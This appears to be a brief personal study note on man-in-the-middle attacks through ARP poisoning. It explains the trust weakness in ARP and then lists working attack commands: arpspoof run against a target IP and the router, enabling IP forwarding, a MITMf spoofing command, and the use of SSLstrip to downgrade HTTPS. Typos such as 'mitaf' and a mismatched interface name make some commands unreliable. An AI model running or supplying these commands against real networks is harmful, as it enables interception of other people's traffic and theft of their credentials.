//Man in the middle attacks
//ARP Poisoning

//The main issues with ARP are as followed
1. Each ARP request/response is trusted
2. Clients can accept responses even if they did not send a request


//We will essential send an ARP response to the client telling it that we are the router


//Actually running it we will use ARPSpoof

arpspoof -i wlan0 -t (TARGETIP) (ROUTERIP)
meanwile running
arpspoof -i wlan -t (ROUTERIP) (TARGETIP)

//Meanwhile we need to enable ip forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward



//Another method that has more features

mitaf --arp --spoof --gateway (ROUTERIP) --target (TARGETIP) -i (INTEFACE)

//Bypassing HTTPS by using SSLstrip to turn it into http
 Just the same as the previous commands because it automatically does it for us
